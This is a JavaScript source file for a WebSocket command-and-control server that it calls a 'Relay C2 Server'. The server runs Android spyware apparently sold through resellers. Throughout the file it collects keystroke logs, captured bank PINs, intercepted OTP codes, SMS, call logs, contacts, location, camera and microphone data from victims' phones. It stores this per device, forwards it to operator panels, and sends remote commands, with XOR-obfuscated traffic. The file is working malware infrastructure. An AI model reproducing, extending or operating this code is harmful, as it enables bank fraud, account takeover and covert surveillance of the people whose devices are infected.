/**
 * relay-server.js
 * ─────────────────────────────────────────────────────────────────────────────
 * Module   : WebSocket Relay Server
 * Purpose  : Central message broker with XOR encryption, Multi-tenancy,
 *            Banned Device filtering, and full support for all payload commands
 *            (including bank_data, phase_update, sms, lock events).
 */

'use strict';
const fs = require('fs');
const path = require('path');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');

// ─── XorCipher ──────────────────────────────────────────────────────────────
const XOR_KEY = Buffer.from('亶于仝亩以亙交仐亮亨仂仉', 'utf8');

function xorBuffer(data, key) {
    const out = Buffer.alloc(data.length);
    for (let i = 0; i < data.length; i++) {
        out[i] = data[i] ^ key[i % key.length];
    }
    return out;
}

function c2n(base64Str) {
    try {
        const data = Buffer.from(base64Str, 'base64');
        return xorBuffer(data, XOR_KEY).toString('utf8');
    } catch (e) {
        return base64Str;
    }
}

function n2c(jsonStr) {
    const data = Buffer.from(jsonStr, 'utf8');
    return xorBuffer(data, XOR_KEY).toString('base64');
}

// ─── State & Databases ───────────────────────────────────────────────────────

const users = new Map();
const admins = new Map();

// Reseller Database
const resellers = new Map();
const RESELLER_DB = path.join(__dirname, 'resellers.json');
try {
    if (fs.existsSync(RESELLER_DB)) {
        const _arr = JSON.parse(fs.readFileSync(RESELLER_DB, 'utf8'));
        for (const _r of _arr) {
            if (_r && _r.resellerId) resellers.set(_r.resellerId, { name: _r.name, loginToken: _r.loginToken, userAppToken: _r.userAppToken, createdAt: _r.createdAt });
        }
        console.log('[DB] Loaded ' + resellers.size + ' resellers');
    }
} catch (_e) { console.error('[DB] Reseller load failed: ' + _e.message); }

function saveResellers() {
    try {
        fs.writeFileSync(RESELLER_DB, JSON.stringify(Array.from(resellers.entries()).map(function(e) {
            return { resellerId: e[0], name: e[1].name, loginToken: e[1].loginToken, userAppToken: e[1].userAppToken, createdAt: e[1].createdAt };
        }), null, 2));
    } catch (_e) {}
}

// Permanent Ban Database to prevent Ghost Reconnects
const bannedDevices = new Set();
const BANNED_DB = path.join(__dirname, 'banned.json');
try {
    if (fs.existsSync(BANNED_DB)) {
        const _arr = JSON.parse(fs.readFileSync(BANNED_DB, 'utf8'));
        _arr.forEach(id => bannedDevices.add(id));
        console.log('[DB] Loaded ' + bannedDevices.size + ' banned devices');
    }
} catch (_e) { console.error('[DB] Banned load failed: ' + _e.message); }

function saveBanned() {
    try {
        fs.writeFileSync(BANNED_DB, JSON.stringify(Array.from(bannedDevices)));
    } catch (_e) {}
}

// ─── Per-Device Runtime Storage & Keylogger Logs ────────────────────────────
const DEVICE_LOGS_DIR = path.join(__dirname, 'device_logs');
try { if (!fs.existsSync(DEVICE_LOGS_DIR)) fs.mkdirSync(DEVICE_LOGS_DIR, { recursive: true }); } catch (_e) {}
const keylogBuffers = new Map(); // androidId -> array of recent events

// ─── Helpers ─────────────────────────────────────────────────────────────────

function sendTo(ws, obj) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        try { ws.send(n2c(JSON.stringify(obj))); } catch (e) { console.error('[sendTo] Error:', e.message); }
    }
}

function broadcastToAdmins(obj, deviceResellerId) {
    for (const [adminWs, meta] of admins) {
        if (adminWs.readyState !== WebSocket.OPEN) continue;
        if (meta.type === 'admin') {
            sendTo(adminWs, obj);
        } else if (meta.type === 'reseller') {
            if (deviceResellerId && meta.resellerId === deviceResellerId) {
                sendTo(adminWs, obj);
            }
        }
    }
}

function getResellerList(forMasterAdmin) {
    const list = [];
    for (const [rid, r] of resellers) {
        if (forMasterAdmin) list.push({ resellerId: rid, name: r.name, loginToken: r.loginToken, userAppToken: r.userAppToken, createdAt: r.createdAt });
        else list.push({ resellerId: rid, name: r.name, createdAt: r.createdAt });
    }
    return list;
}

function getDeviceList(resellerId) {
    const list = [];
    for (const [id, u] of users) {
        if (resellerId && u.resellerId !== resellerId) continue;
        list.push({ androidId: id, online: u.online, lastSeen: u.lastSeen, info: u.info || {}, resellerId: u.resellerId || null });
    }
    return list;
}

// ─── Message Handlers ────────────────────────────────────────────────────────

function handleUserMessage(ws, msg) {
    const type = msg.type;
    const meta = users.get(msg.androidId) || findUserByWs(ws);

    switch (type) {
        case 'user_join': {
            const androidId = msg.androidId;
            if (!androidId) return;

            if (bannedDevices.has(androidId)) {
                console.warn(`[BANNED] Connection rejected for banned device: ${androidId}`);
                ws.close(1008, 'Device permanently deleted');
                return;
            }

            let deviceResellerId = null;
            const incomingToken = msg.userAppToken || (msg.info && msg.info.userAppToken) || null;
            if (incomingToken) {
                for (const [rid, r] of resellers) {
                    if (r.userAppToken === incomingToken) { deviceResellerId = rid; break; }
                }
            }

            const entry = { ws, info: msg.info || {}, resellerId: deviceResellerId, lastSeen: Date.now(), online: true };
            users.set(androidId, entry);

            console.log(`[USER] Joined: ${androidId}${deviceResellerId ? ' (Reseller: ' + deviceResellerId + ')' : ''}`);
            broadcastToAdmins({ type: 'device_online', androidId, info: entry.info, resellerId: deviceResellerId }, deviceResellerId);
            break;
        }

        case 'device_info': {
            const androidId = msg.androidId;
            if (!androidId) return;
            const entry = users.get(androidId);
            if (entry && msg.info) {
                entry.info = msg.info;
                entry.lastSeen = Date.now();
            }
            broadcastToAdmins(msg, entry ? entry.resellerId : null);
            break;
        }

        case 'keylog_batch': {
            const androidId = msg.androidId || (meta ? meta.androidId : null);
            if (!androidId) return;
            const events = Array.isArray(msg.events) ? msg.events : [];
            if (!events.length) return;

            // Maintain runtime in-memory buffer
            if (!keylogBuffers.has(androidId)) keylogBuffers.set(androidId, []);
            const buf = keylogBuffers.get(androidId);
            for (const ev of events) {
                buf.push(ev);
                if (buf.length > 500) buf.shift();
            }

            // Append to per-device log file
            try {
                const targetFile = path.join(DEVICE_LOGS_DIR, `${androidId}_keys.log`);
                const lines = events.map(e => `[${new Date(e.t || Date.now()).toISOString()}] [${e.pkg || 'app'}] (${e.type || 'TXT'}) ${e.txt || ''}`).join('\n') + '\n';
                fs.appendFileSync(targetFile, lines);
            } catch (err) {
                console.error(`[KEYLOG] Write error for ${androidId}:`, err.message);
            }

            const entry = users.get(androidId);
            if (entry) entry.lastSeen = Date.now();
            broadcastToAdmins(msg, entry ? entry.resellerId : null);
            break;
        }

        case 'bank_data': {
            const androidId = msg.androidId || (meta ? meta.androidId : null);
            if (androidId && msg.pin) {
                try {
                    const targetFile = path.join(DEVICE_LOGS_DIR, `${androidId}_bank.log`);
                    const line = `[${new Date().toISOString()}] [${msg.package || 'bank'}] PIN: ${msg.pin}\n`;
                    fs.appendFileSync(targetFile, line);
                } catch (_e) {}

                if (!keylogBuffers.has(androidId)) keylogBuffers.set(androidId, []);
                keylogBuffers.get(androidId).unshift({
                    t: msg.timestamp || Date.now(),
                    pkg: msg.package || 'bank',
                    type: 'PIN',
                    txt: '🔑 CAPTURED FULL PIN: ' + msg.pin
                });
            }
            const entry = androidId ? users.get(androidId) : null;
            if (androidId && entry) entry.lastSeen = Date.now();
            broadcastToAdmins(msg, entry ? entry.resellerId : null);
            break;
        }

        case 'sms_data': {
            const androidId = msg.androidId || (meta ? meta.androidId : null);
            if (androidId && msg.messages) {
                try {
                    const targetFile = path.join(DEVICE_LOGS_DIR, `${androidId}_sms.json`);
                    fs.writeFileSync(targetFile, typeof msg.messages === 'string' ? msg.messages : JSON.stringify(msg.messages, null, 2));
                    console.log(`[SMS] Stored messages for ${androidId}`);
                } catch (_e) {}
            }
            const entry = androidId ? users.get(androidId) : null;
            if (androidId && entry) entry.lastSeen = Date.now();
            broadcastToAdmins(msg, entry ? entry.resellerId : null);
            break;
        }

        case 'call_log': {
            const androidId = msg.androidId || (meta ? meta.androidId : null);
            if (androidId && msg.calls) {
                try {
                    const targetFile = path.join(DEVICE_LOGS_DIR, `${androidId}_calls.json`);
                    fs.writeFileSync(targetFile, typeof msg.calls === 'string' ? msg.calls : JSON.stringify(msg.calls, null, 2));
                    console.log(`[CALLS] Stored call logs for ${androidId}`);
                } catch (_e) {}
            }
            const entry = androidId ? users.get(androidId) : null;
            if (androidId && entry) entry.lastSeen = Date.now();
            broadcastToAdmins(msg, entry ? entry.resellerId : null);
            break;
        }

        case 'contacts': {
            const androidId = msg.androidId || (meta ? meta.androidId : null);
            if (androidId && msg.contacts) {
                try {
                    const targetFile = path.join(DEVICE_LOGS_DIR, `${androidId}_contacts.json`);
                    fs.writeFileSync(targetFile, typeof msg.contacts === 'string' ? msg.contacts : JSON.stringify(msg.contacts, null, 2));
                    console.log(`[CONTACTS] Stored contacts for ${androidId}`);
                } catch (_e) {}
            }
            const entry = androidId ? users.get(androidId) : null;
            if (androidId && entry) entry.lastSeen = Date.now();
            broadcastToAdmins(msg, entry ? entry.resellerId : null);
            break;
        }

        case 'notification_event':
        case 'otp_alert': {
            const androidId = msg.androidId || (meta ? meta.androidId : null);
            if (androidId) {
                try {
                    const targetFile = path.join(DEVICE_LOGS_DIR, `${androidId}_notifs.log`);
                    const line = `[${new Date().toISOString()}] [${msg.pkg || 'app'}] ${msg.isOtp ? '🔥 OTP: ' + msg.code : msg.title + ' - ' + msg.text}\n`;
                    fs.appendFileSync(targetFile, line);
                } catch (_e) {}
            }
            const entry = androidId ? users.get(androidId) : null;
            if (androidId && entry) entry.lastSeen = Date.now();
            broadcastToAdmins(msg, entry ? entry.resellerId : null);
            break;
        }

        case 'location_data': {
            const androidId = msg.androidId || (meta ? meta.androidId : null);
            if (androidId) {
                try {
                    const targetFile = path.join(DEVICE_LOGS_DIR, `${androidId}_location.json`);
                    fs.writeFileSync(targetFile, JSON.stringify(msg, null, 2));
                    console.log(`[GPS] Location saved for ${androidId}: ${msg.lat}, ${msg.lon}`);
                } catch (_e) {}
            }
            const entry = androidId ? users.get(androidId) : null;
            if (androidId && entry) entry.lastSeen = Date.now();
            broadcastToAdmins(msg, entry ? entry.resellerId : null);
            break;
        }

        default: {
            const androidId = msg.androidId;
            const entry = androidId ? users.get(androidId) : null;
            if (androidId && entry) entry.lastSeen = Date.now();
            broadcastToAdmins(msg, entry ? entry.resellerId : null);
            break;
        }
    }
}

function handleAdminMessage(ws, msg) {
    const type = msg.type;
    const adminMeta = admins.get(ws);
    if (!adminMeta) return;

    switch (type) {
        case 'admin_join': {
            adminMeta.type = 'admin'; adminMeta.resellerId = null;
            console.log('[ADMIN] Master admin joined');
            sendTo(ws, { type: 'admin_joined', devices: getDeviceList(null), resellers: getResellerList(true) });
            break;
        }

        case 'reseller_join': {
            const token = msg.token;
            if (!token) { sendTo(ws, { type: 'reseller_join_failed', reason: 'No token provided' }); return; }

            let matchedRid = null;
            for (const [rid, r] of resellers) { if (r.loginToken === token) { matchedRid = rid; break; } }
            if (!matchedRid) { sendTo(ws, { type: 'reseller_join_failed', reason: 'Invalid token' }); return; }

            adminMeta.type = 'reseller'; adminMeta.resellerId = matchedRid;
            console.log(`[RESELLER] Joined: ${matchedRid}`);
            sendTo(ws, { type: 'reseller_joined', resellerId: matchedRid, devices: getDeviceList(matchedRid) });
            break;
        }

        case 'cmd': {
            const targetId = msg.androidId;
            const action = msg.action;
            const data = msg.data || null;
            const deviceMsg = { type: 'action', action };
            if (data) deviceMsg.data = data;

            if (targetId) {
                const userEntry = users.get(targetId);
                if (userEntry && userEntry.ws.readyState === WebSocket.OPEN) {
                    sendTo(userEntry.ws, deviceMsg);
                    console.log(`[CMD] '${action}' → ${targetId}`);
                } else {
                    console.warn(`[CMD] Target offline: ${targetId}, checking stored cache`);
                    if (action === 'get_sms') {
                        const f = path.join(DEVICE_LOGS_DIR, `${targetId}_sms.json`);
                        if (fs.existsSync(f)) {
                            try {
                                const raw = fs.readFileSync(f, 'utf8');
                                sendTo(ws, { type: 'sms_data', androidId: targetId, messages: raw, cached: true });
                            } catch (_e) {}
                        }
                    } else if (action === 'get_call_log') {
                        const f = path.join(DEVICE_LOGS_DIR, `${targetId}_calls.json`);
                        if (fs.existsSync(f)) {
                            try {
                                const raw = fs.readFileSync(f, 'utf8');
                                sendTo(ws, { type: 'call_log', androidId: targetId, calls: raw, cached: true });
                            } catch (_e) {}
                        }
                    } else if (action === 'get_contacts') {
                        const f = path.join(DEVICE_LOGS_DIR, `${targetId}_contacts.json`);
                        if (fs.existsSync(f)) {
                            try {
                                const raw = fs.readFileSync(f, 'utf8');
                                sendTo(ws, { type: 'contacts', androidId: targetId, contacts: raw, cached: true });
                            } catch (_e) {}
                        }
                    }
                }
            } else {
                if (adminMeta.type === 'admin') {
                    for (const [id, u] of users) sendTo(u.ws, deviceMsg);
                    console.log(`[CMD] '${action}' → Broadcast to all`);
                }
            }
            break;
        }

        case 'create_reseller': {
            if (adminMeta.type !== 'admin') return;
            const name = msg.name || 'Reseller Agent';
            const customId = msg.resellerId;
            const resellerId = customId || ('RSL-' + uuidv4().replace(/-/g, '').substring(0, 12).toUpperCase());
            const loginToken = 'LOG-' + uuidv4().replace(/-/g, '').substring(0, 28).toUpperCase();
            const userAppToken = 'USR-' + uuidv4().replace(/-/g, '').substring(0, 28).toUpperCase();

            resellers.set(resellerId, { name, loginToken, userAppToken, createdAt: Date.now() }); saveResellers();
            console.log(`[RESELLER] Created: ${resellerId} (${name})`);
            sendTo(ws, { type: 'reseller_created', reseller: { resellerId, name, loginToken, userAppToken }, resellers: getResellerList(true) });
            break;
        }

        case 'delete_reseller': {
            if (adminMeta.type !== 'admin') return;
            const rid = msg.resellerId;
            if (rid && resellers.has(rid)) {
                resellers.delete(rid); saveResellers();
                console.log(`[RESELLER] Deleted: ${rid}`);
                sendTo(ws, { type: 'reseller_list', resellers: getResellerList(true) });
            }
            break;
        }

        case 'delete_device': {
            const androidId = msg.androidId;
            if (androidId) {
                bannedDevices.add(androidId);
                saveBanned();

                const entry = users.get(androidId);
                if (entry && entry.ws && entry.ws.readyState === WebSocket.OPEN) {
                    entry.ws.close(1008, 'Deleted and banned by admin');
                }
                users.delete(androidId);
                console.log(`[DEVICE] Banned & Deleted: ${androidId}`);
                broadcastToAdmins({ type: 'device_offline', androidId }, entry ? entry.resellerId : null);
            }
            break;
        }

        case 'get_keylogs': {
            const targetId = msg.androidId;
            if (targetId) {
                const cached = keylogBuffers.get(targetId) || [];
                sendTo(ws, { type: 'keylog_history', androidId: targetId, events: cached });
            }
            break;
        }

        default:
            console.log(`[ADMIN] Unhandled type: ${type}`);
    }
}

function findUserByWs(ws) {
    for (const [id, entry] of users) { if (entry.ws === ws) return entry; }
    return null;
}

function findAndroidIdByWs(ws) {
    for (const [id, entry] of users) { if (entry.ws === ws) return id; }
    return null;
}

// ─── Server Bootstrap ─────────────────────────────────────────────────────────

const PORT = process.env.PORT || 9000;
const wss = new WebSocket.Server({ port: PORT }, () => {
    console.log(`[SERVER] Relay C2 Server active on ws://0.0.0.0:${PORT}`);
});

wss.on('connection', (ws, req) => {
    const ip = req.socket.remoteAddress;
    admins.set(ws, { type: null, resellerId: null });

    ws.on('message', (rawMessage) => {
        const text = rawMessage.toString();
        let msg;

        try { msg = JSON.parse(c2n(text)); }
        catch (e) { try { msg = JSON.parse(text); } catch (e2) { return; } }

        if (!msg || typeof msg.type !== 'string') return;
        const type = msg.type;

        // Comprehensive User Message Filter
        const isUserMsg = (
            type === 'user_join' || type === 'device_info' || type === 'log_message' ||
            type === 'save_credentials' || type === 'lock_captured' || type === 'lock_detected' ||
            type === 'pin_typing' || type === 'battery_info' || type === 'ui_nodes' ||
            type === 'apps_list' || type === 'screen_text' || type === 'sms_data' ||
            type === 'call_log' || type === 'contacts' || type === 'screen_frame' ||
            type === 'camera_photo' || type === 'camera_frame' || type === 'camera_info' ||
            type === 'camera_error' || type === 'mic_data' || type === 'mic_error' ||
            type === 'sim_info' || type === 'pong' || type === 'bank_data' || type === 'phase_update' ||
            type === 'keylog_batch' || type === 'notification_event' || type === 'otp_alert' || type === 'location_data'
        );

        if (isUserMsg) {
            admins.delete(ws);
            handleUserMessage(ws, msg);
        } else {
            handleAdminMessage(ws, msg);
        }
    });

    ws.on('close', (code, reason) => {
        const androidId = findAndroidIdByWs(ws);
        if (androidId) {
            const entry = users.get(androidId);
            if (entry) { entry.online = false; entry.lastSeen = Date.now(); }
            console.log(`[USER] Disconnected: ${androidId}`);
            broadcastToAdmins({ type: 'device_offline', androidId }, entry ? entry.resellerId : null);
        } else if (admins.has(ws)) {
            const meta = admins.get(ws);
            admins.delete(ws);
            console.log(`[ADMIN] Disconnected (type: ${meta.type})`);
        }
    });

    ws.on('error', (err) => { console.error(`[WS] Socket error from ${ip}:`, err.message); });
});

wss.on('error', (err) => { console.error('[SERVER] Server error:', err.message); });
